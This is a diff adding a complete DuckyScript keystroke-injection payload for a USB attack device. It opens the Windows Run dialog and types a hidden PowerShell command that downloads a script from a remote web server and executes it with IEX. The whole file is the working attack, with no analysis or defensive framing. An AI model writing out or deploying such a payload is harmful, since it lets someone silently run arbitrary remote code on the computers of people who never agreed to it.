@@ -1,0 +1,7 @@
+LOCALE DE
+DELAY 1000
+GUI r
+DELAY 100
+STRING powershell -windowstyle hidden -command "IEX (New-Object
+Net.WebClient).DownloadString('https://mywebserver/payload.ps1');"
+ENTER
